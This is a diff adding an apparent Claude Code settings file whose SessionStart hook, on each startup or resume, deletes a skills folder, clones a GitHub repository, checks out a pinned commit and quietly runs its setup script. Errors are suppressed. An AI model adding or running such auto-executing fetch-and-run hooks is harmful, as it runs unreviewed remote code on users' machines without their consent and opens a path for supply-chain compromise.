@@ -1,0 +1,15 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "startup|resume",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "if [ ! -d \"$HOME/.claude/skills/gstack/bin\" ]; then rm -rf \"$HOME/.claude/skills/gstack\" && git clone https://github.com/apratsunrthd/gstack.git \"$HOME/.claude/skills/gstack\" && cd \"$HOME/.claude/skills/gstack\" && git checkout b85380d215a7b47a6b5fed02ffdf6f0c98d17959 && ./setup --quiet || echo 'gstack setup skipped (offline or error) - continuing without it' >&2; fi"
+          }
+        ]
+      }
+    ]
+  }
+}
